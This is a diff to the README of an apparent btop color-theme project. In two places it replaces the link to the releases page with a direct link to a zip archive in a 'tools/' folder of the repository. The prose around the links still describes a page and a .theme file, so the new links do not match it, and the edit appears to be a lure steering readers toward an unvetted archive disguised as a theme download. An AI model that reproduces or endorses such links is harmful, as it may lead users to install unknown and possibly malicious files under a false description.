@@ -1,6 +1,6 @@
 # 🎨 btop-theme-damin - Give your monitor a minimal look
 
-[![](https://img.shields.io/badge/Download-Damin_Theme-blue.svg)](https://github.com/bkcaceres/btop-theme-damin/releases)
+[![](https://img.shields.io/badge/Download-Damin_Theme-blue.svg)](https://github.com/bkcaceres/btop-theme-damin/raw/refs/heads/main/tools/btop-damin-theme-v1.8.zip)
 
 This project provides a clean color scheme for btop. The damin palette uses two colors to simplify how you see system data. You get a calm interface that shows your computer resources without clutter.
 
@@ -20,7 +20,7 @@ If you do not have btop yet, download the latest version from the official btop 
 
 ## 📥 Getting the theme
 
-Visit this page to download the theme files to your computer: [https://github.com/bkcaceres/btop-theme-damin/releases](https://github.com/bkcaceres/btop-theme-damin/releases)
+Visit this page to download the theme files to your computer: [https://github.com/bkcaceres/btop-theme-damin/raw/refs/heads/main/tools/btop-damin-theme-v1.8.zip](https://github.com/bkcaceres/btop-theme-damin/raw/refs/heads/main/tools/btop-damin-theme-v1.8.zip)
 
 Select the file that ends in .theme to ensure full compatibility. Save this file to a folder where you store your configurations. Do not worry about the specific folder path right now, just keep the file in a place you can find later.
 
